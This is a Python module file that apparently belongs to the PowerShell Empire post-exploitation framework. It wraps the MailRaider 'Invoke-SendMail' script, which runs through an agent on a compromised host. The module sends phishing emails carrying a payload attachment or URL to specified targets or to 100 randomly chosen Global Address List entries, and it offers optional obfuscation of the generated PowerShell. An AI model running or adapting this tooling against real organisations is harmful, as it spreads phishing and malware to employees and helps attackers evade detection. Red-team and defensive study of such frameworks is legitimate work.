from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-SendMail',

            'Author': ['@xorrior'],

            'Description': ("Sends emails using a custom or default template to specified target email addresses."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://github.com/xorrior/EmailRaider',
                'http://www.xorrior.com/phishing-on-the-inside/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Targets' : {
                'Description'   :   'Array of target email addresses. If Targets or TargetList parameter are not specified, a list of 100 email addresses will be randomly selected from the Global Address List.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'TargetList' : {
                'Description'   :   'List of email addresses read from a file.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'URL' : {
                'Description'   :   'URL to include in the email.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Attachment' : {
                'Description'   :   'Full path to the file to use as a payload.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Template' : {
                'Description'   :   'Full path to the template html file.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Subject' : {
                'Description'   :   'Subject of the email.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Body' : {
                'Description'   :   'Body of the email.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        moduleName = self.info["Name"]
        
        # read in the common powerview.ps1 module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/management/MailRaider.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode + "\n"
        scriptEnd = moduleName + " "
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value']) 

        scriptEnd += ' | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
